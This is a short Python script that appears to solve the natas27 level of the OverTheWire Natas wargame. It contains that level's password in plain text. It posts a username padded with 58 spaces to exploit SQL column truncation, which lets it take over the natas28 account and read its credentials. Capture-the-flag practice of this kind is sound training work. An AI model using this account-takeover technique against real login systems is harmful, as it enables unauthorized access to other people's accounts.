#!/bin/python
import requests

username = "natas27"
pwd = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"
url = f"http://{username}.natas.labs.overthewire.org/"
session = requests.Session()

#First run this 

#data = {'username':'natas28'+' '*58+'lol', 'password':'lol'}
#response=session.post(url,data=data,auth=(username,pwd))
#print(response.text)

data = {'username':'natas28', 'password':'lol'}
response=session.post(url,data=data,auth=(username,pwd))
print(response.text)

